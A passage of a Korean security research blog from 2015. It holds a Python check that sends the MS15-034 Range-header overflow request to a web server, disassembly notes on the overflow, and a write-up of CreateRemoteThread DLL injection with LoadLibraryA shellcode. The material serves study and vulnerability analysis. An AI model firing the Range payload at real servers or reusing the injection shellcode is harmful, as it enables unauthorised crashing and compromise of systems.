<time class='entry-date' datetime='2015-04-16T16:09:37+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:09 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="n">target</span> <span class="o">=</span> <span class="s">&#39;www.babo.com&#39;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">port</span><span class="p">)</span> <span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;GET / HTTP/1.1</span><span class="se">\r\n</span><span class="s">Host: www.babo.com</span><span class="se">\r\n</span><span class="s">Range: bytes=0-18446744073709551615</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">resp</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="s">&quot;Range Not Satisfiable&quot;</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;Looks vulnerable.&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Errata Security Blog 에 따르면, GET request 가 static contents 에 들어가야만 <code>Range:</code> 가 처리되서 버그가 trigger 된다고 한다. <code>.asp</code> 같은 동적 contents 를 호출하면 trigger 할 수 없다는 이야기.</p>

<p><a href="http://blog.beyondtrust.com/the-delicate-art-of-remote-checks-a-glance-into-ms15-034">The Delicate Art of Remote Checks - A Glance Into MS15-034</a> 를 읽어보니,</p>

<ul>
<li>bindiff 를 때리고</li>
<li>similarity 를 보고 패치가 들어간 함수들을 찾아서,</li>
<li>IDA Pro 로 보니, <code>_UlpParseRange@32</code> 의 caller 는 <code>_UlContentRangeHeaderHandler@20</code></li>
<li>`kd> bp HTTP!urlparserange &ldquo;k;g&rdquo;</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="mo">0006</span><span class="n">ED31</span>    <span class="n">_UlpParseRange</span><span class="nd">@32</span>
</span><span class='line'>
</span><span class='line'><span class="mo">0006</span><span class="n">EEF9</span>    <span class="n">sub</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">edi</span>
</span><span class='line'><span class="mo">0006</span><span class="n">EEFB</span>    <span class="n">sbb</span>     <span class="n">ecx</span><span class="p">,</span> <span class="n">edx</span>
</span><span class='line'><span class="mo">0006</span><span class="n">EEFD</span>    <span class="n">add</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'><span class="mo">0006</span><span class="n">EF00</span>    <span class="n">adc</span>     <span class="n">ecx</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'><span class="mo">0006</span><span class="n">EF03</span>    <span class="n">mov</span>     <span class="n">ds</span><span class="p">:[</span><span class="n">esi</span><span class="p">],</span> <span class="n">eax</span>
</span><span class='line'><span class="mo">0006</span><span class="n">EF05</span>    <span class="n">mov</span>     <span class="n">ds</span><span class="p">:[</span><span class="n">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="n">ecx</span>
</span></code></pre></td></tr></table></div></figure>


<p>코드상으로 보면 <code>ecx:eax</code> 에서 <code>edx:edi</code> 를 subtract 하는 것이다. 즉 8 바이트 더하기/빼기 연산.
하단부터 빼고, <code>sbb</code> 로 borrow 까지 쳐서 빼는 코드.
그리고, 하단에 <code>+1</code> 을 하고, 상단에 <code>adc</code> 로 캐리까지 올려서 더해주기.</p>

<p><code>Range: A-B</code> 에서 <code>B - A + 1</code> 을 구현하는 코드로 보인다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
</span><span class='line'><span class="il">18446744073709551615L</span>
</span></code></pre></td></tr></table></div></figure>


<p>여기에 <code>B</code> 값에 <code>0xFFFFFFFFFFFFFFFF</code> 이 들어가면서 문제가 벌어지는 것 같은데.</p>

<p>테스트해보는 김에 다음을 해봐야겠다.</p>

<ol>
<li>Visual C++ 에서 signed/unsigned 다양하게 <code>B - A + 1</code> 을 해본다. B 는 0xFFFFFFFFFFFFFFFF 를 넣어서.</li>
<li>저 x86 인스트럭션을 가지고 그대로 테스트해본다.</li>
</ol>


<p>가장 좋은건 취약한 IIS 버전을 VM 에 올려서 kd 를 걸고 해보는 것인데, 나중에 해볼련다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/04/15/createremotethread-bypass-windows-7-session-separation/">CreateRemoteThread. Bypass Windows 7 Session Separation</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-04-15T16:51:11+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:51 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="http://syprog.blogspot.kr/2012/05/createremotethread-bypass-windows.html">CreateRemoteThread. Bypass Windows 7 Session Separation</a> 을 정리.</p>

<h5>Opening the Victim Process</h5>

<p>Target 에 어태치할때&hellip;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HANDLE WINAPI OpenProcess(
</span><span class='line'>    DWORD dwDesiredAccess, /* PROCESS_ALL_ACCESS */
</span><span class='line'>    BOOL bInheritHandle, /* FALSE */
</span><span class='line'>    DWORD dwProcessID 
</span><span class='line'>    );</span></code></pre></td></tr></table></div></figure>


<h4>Reading the Shellcode</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use 32
</span><span class='line'>    ; offset of the LoadLibraryA address within the shellcode
</span><span class='line'>    dd func
</span><span class='line'>    ; save all registers
</span><span class='line'>    push eax ebx ecx edx ebp edi esi
</span><span class='line'>    ; get your EIP
</span><span class='line'>    call next
</span><span class='line'>next:
</span><span class='line'>    pop eax
</span><span class='line'>    mov ebx, eax
</span><span class='line'>    ; get the address of the DLL name
</span><span class='line'>    mov eax, string - next
</span><span class='line'>    ; do this to avoid possible negative values (due to sign extend)
</span><span class='line'>    movzx eax, al
</span><span class='line'>    add eax, ebx
</span><span class='line'>    ; pass it to the LoadLibraryA API
</span><span class='line'>    push eax
</span><span class='line'>    ; get the address of the LoadLibraryA function
</span><span class='line'>    mov eax, func - next
</span><span class='line'>    movzx eax, al
</span><span class='line'>    add eax, ebx
</span><span class='line'>    mov eax, [eax]
</span><span class='line'>    ; call LoadLibraryA
</span><span class='line'>    call eax
</span><span class='line'>    ; restore registers
</span><span class='line'>    pop esi edi ebp edx ecx ebx eax
</span><span class='line'>    ; return
</span><span class='line'>    ret
</span><span class='line'>func dd 0x12345678 ; placeholder for the address
</span><span class='line'>string:</span></code></pre></td></tr></table></div></figure>


<p>메모리에 shellcode 를 넣고, DLL path 를 strcat() 한다. 그리고, <code>LoadLibraryA()</code> 어드레스를 채워준다. 채워줄때는 쉘코드 첫 DD 를 참조하여 <code>func</code> 의 offset 을 계산한다. 이 작업을 해야 usable 한 shellcode 가 된다.</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/8">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/6">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/01/11/cve-2013-2094-perf-swevent-enabled-revisited/">CVE-2013-2094: Perf_swevent_enabled Revisited</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour/">BSides Vienna 2015: Writing Your First Windows Exploit in Less Than One Hour</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/01/11/sock-sendpage/">Sock_sendpage</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/23/on-the-juniper-backdoor/">On the Juniper Backdoor</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/07/trustnone/">TRUSTNONE</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - KC -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
